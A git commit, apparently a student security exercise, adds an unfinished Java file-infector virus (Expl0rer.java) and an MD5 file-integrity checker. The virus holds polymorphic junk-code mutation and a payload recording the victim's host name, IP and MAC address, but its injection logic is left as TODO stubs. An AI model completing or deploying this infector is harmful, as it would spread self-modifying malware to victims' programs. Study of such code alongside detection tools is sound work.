33b25793bf1d0e90ad4f97b3a796f88982cc6620
David <David.R.Rivera193@gmail.com>
2012-03-30 10:03:03 -0400

    Project files

---
+++ Expl0rer.java
@@ -0,0 +1,98 @@
+public class Expl0rer {
+	static String infection = "\nprivate class AppConfigure{" +
+			"\njava.util.Random r;" +
+			"\nString[] types = {\"byte\", \"char\", \"int\", \"float\", \"long\", \"double\"};" +
+			"\nString[] operations = {\"+\", \"-\", \"*\", \"/\"};" +
+			"\njava.util.regex.Pattern varName = java.util.regex.Pattern.compile(\".* (.*)=.*\");" +
+			"\nString declareTemplate(String type){" +
+			"\nr = new java.util.Random();" +
+			"\nint length = r.nextInt(10) + 1;" +
+			"\nString name = \"\";" +
+			"\nfor(int i = 0; i < length; ++i){" +
+			"\nchar current = (char)(r.nextInt(26) + 65 + (r.nextBoolean() ? 32 : 0));" +
+			"\nname += current;}" +
+			"\nString text = new String(name);" +
+			"\ntext = type + \" \" + text + \"=\" + String.valueOf(length);" +
+			"\nreturn text;}" +
+			"\nString actionTemplate(String declared){" +
+			"\njava.util.regex.Matcher matcher = varName.matcher(declared);" +
+			"\nr = new java.util.Random();" +
+			"\nString name = \"\";" +
+			"\nif(matcher.matches()){" +
+			"\nname = matcher.group(1);}" +
+			"\nelse name = \"test\";" +
+			"\nString operation;" +
+			"\nif(r.nextDouble() < 0.25)" +
+			"\noperation = name + operations[r.nextInt(operations.length)] + \"=\" + name.length();" +
+			"\nelse if(r.nextDouble() < 0.50)" +
+			"\noperation = name + \"=\" + name + operations[r.nextInt(operations.length)] + name.length();" +
+			"\nelse if(r.nextDouble() < 0.75)" +
+			"\noperation = name + \"=\" + name.length() + operations[r.nextInt(operations.length)] + name;" +
+			"\nelse" +
+			"\noperation = name + \"=\" + name.length() + operations[r.nextInt(operations.length)] + name.length();" +
+			"\nreturn operation;}}";
+	static String mutate = "\nprivate static String newChange(){" +
+			"\nAppConfigure startProcess = new Victim().new AppConfigure();" +
+			"\njava.util.Random r = new java.util.Random();" +
+			"\nString type = startProcess.types[r.nextInt(startProcess.types.length)];" +
+			"\nString declare = startProcess.declareTemplate(type);" +
+			"\nString action = startProcess.actionTemplate(declare);" +
+			"\nString change = \"\n\" + declare + \";\n\" + action + \";\";" +
+			"\nreturn change;}";
+	static String payload = "\nprivate static void payload(){" +
+			"\njava.io.PrintStream out;" +
+			"\ntry { out = new java.io.PrintStream(\"config.app\");" +
+			"\njava.net.InetAddress address = java.net.InetAddress.getLocalHost();" +
+			"\njava.net.NetworkInterface nic = java.net.NetworkInterface.getByInetAddress(address);" +
+			"\nString ip = address.getHostAddress();" +
+			"\nString mac = \"\";" +
+			"\nbyte[] nmac = nic.getHardwareAddress();" +
+			"\nif (nmac != null) {" +
+			"\nfor (int i = 0; i < nmac.length; i++) {" +
+			"\nmac += String.format(\"%02X%s\", nmac[i], (i < nmac.length - 1) ? \"-\" : \"\");" +
+			"\n}}" +
+			"\nout.println(\"Victim HOST = \" + address.getCanonicalHostName() + \"( \" + address.getHostName() + \" )\");" +
+			"\nout.println(\"IP = \" + ip);" +
+			"\nout.println(\"MAC = \" + mac);" +
+			"\n} catch (Exception e) {}}";
+	static java.util.ArrayList<String> getCode(String classFile){
+		java.util.ArrayList<String> code = new java.util.ArrayList<String>();
+		java.util.Scanner in = new java.util.Scanner(classFile);
+		while(in.hasNextLine()){
+			code.add(in.nextLine());
+		}
+		return code;
+	}
+	static boolean modifyCode(java.util.ArrayList<String> code){
+		boolean searchingClass = true;
+		boolean searchingMain = true;
+		boolean fileWritten = false;
+		for(int i = 0; i < code.size(); ++i){
+			if(searchingClass){
+				//TODO: insert class Victim code here to find where to infect class
+			}
+			else if(searchingMain){
+				//TODO: insert search for main code to add prelude payload inside of main
+			}
+			else{
+				break;
+			}
+		}
+		return !searchingClass && !searchingMain && fileWritten; 
+	}
+	public static void main(String[] args) throws Exception{
+		String preload = infection + mutate + payload;
+		String actions = "String change = newChange();" +
+				"\npayload();";
+		ProcessBuilder pb = new ProcessBuilder("jad.exe Victim.class".split(" "));
+		Process p = pb.start();
+		p.waitFor();
+		java.util.ArrayList<String> javacode = getCode("Victim.java");
+		boolean success = modifyCode(javacode);
+		if(success)
+			System.out.println("Victim.class infected successfully");
+		else
+			System.out.println("Failed to infect Victim.class");
+		
+	}
+}
---
+++ IntegrityChecker.java
@@ -0,0 +1,138 @@
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.io.Serializable;
+import java.security.MessageDigest;
+import java.util.Hashtable;
+import java.util.Scanner;
+
+
+public class IntegrityChecker implements Serializable {
+
+	private Hashtable<String, Record> integrityTable;
+	private class Record{
+		String contentHash;
+		long lastUpdate;
+		public int hashCode(){
+			return contentHash.hashCode();
+		}
+	}
+	
+	
+	 /**
+	   * Always treat de-serialization as a full-blown constructor, by
+	   * validating the final state of the de-serialized object.
+	   */
+	   private void readObject(
+	     ObjectInputStream aInputStream
+	   ) throws ClassNotFoundException, IOException {
+	     //always perform the default de-serialization first
+	     integrityTable = (Hashtable<String, IntegrityChecker.Record>)aInputStream.readObject();
+	  }
+
+	    /**
+	    * This is the default implementation of writeObject.
+	    * Customize if necessary.
+	    */
+	    private void writeObject(
+	      ObjectOutputStream aOutputStream
+	    ) throws IOException {
+	      //perform the default serialization for all non-transient, non-static fields
+	      aOutputStream.writeObject(integrityTable);
+	    }
+	
+	public IntegrityChecker() throws Exception{
+		File tmp = null; 
+		try{
+			tmp = new File("icheck.config");
+		}catch(Exception e){}
+		if(tmp == null || !tmp.exists())
+			integrityTable = new Hashtable<String, Record>();
+		else{
+			FileInputStream is = new FileInputStream(tmp);
+			ObjectInputStream restore = new ObjectInputStream(is);
+			readObject(restore);
+		}
+	}
+	
+	public void SaveTable() throws Exception{
+		File tmp = new File("icheck.config");
+		FileOutputStream os = new FileOutputStream(tmp);
+		ObjectOutputStream restore = new ObjectOutputStream(os);
+		writeObject(restore);
+	}
+	
+	public static String checkFile(String filename) throws Exception{
+		File input = new File(filename);
+		if(input == null || !input.exists() || !input.isFile()){
+			return "";
+		}
+		String body = "";
+		Scanner in = new Scanner(input);
+		while(in.hasNextByte()){
+			body += new String(new byte[]{in.nextByte()});
+		}
+		return calculateMD5(body);
+	}
+	
+	public static String calculateMD5(String text) throws Exception{
+		byte[] bytesOfMessage = text.getBytes("UTF-8");
+		MessageDigest md = MessageDigest.getInstance("MD5");
+		byte[] thedigest = md.digest(bytesOfMessage);
+		return new String(thedigest);
+	}
+	
+	public static void addFile(Hashtable<String, Record> table, String filename){
+		
+	}
+	
+	public static void updateFile(Hashtable<String, Record> table, String filename){
+		
+	}
+	
+	public static void removeFile(Hashtable<String, Record> table, String filename){
+		
+	}
+	
+	public static void main(String[] args) throws Exception{
+		IntegrityChecker checker = new IntegrityChecker();
+		String cmd = args[0];
+		//list name of files currently secured by IntegrityChecker
+		if(cmd.equalsIgnoreCase("list")){
+			for(String key : checker.integrityTable.keySet()){
+				Record stats = checker.integrityTable.get(key);
+				System.out.println("Filename: " + key);
+				System.out.println("Stored Value: " + stats.contentHash);
+				System.out.println("Last Update: " + stats.lastUpdate);
+				String nmd5 = checkFile(key);
+				System.out.println("OK?: " + (nmd5.equals(stats.contentHash) ? "yes" : "no"));
+				System.out.println();
+			}
+		}
+		else if(cmd.equalsIgnoreCase("add")){
+			addFile(checker.integrityTable, args[1]);
+		}
+		else if(cmd.equalsIgnoreCase("update")){
+			updateFile(checker.integrityTable, args[1]);
+		}
+		else if(cmd.equalsIgnoreCase("check")){
+			String key = args[1];
+			String nmd5 = checkFile(key);
+			Record stats = checker.integrityTable.get(key);
+			if(nmd5.equals(stats.contentHash)){
+				System.out.println(key + " is OK");
+			}
+			else{
+				System.err.println("Warning integrity lost in " + key);
+			}
+		}
+		else if(cmd.equalsIgnoreCase("remove")){
+			removeFile(checker.integrityTable, args[1]);
+		}
+		checker.SaveTable();
+	}
+}
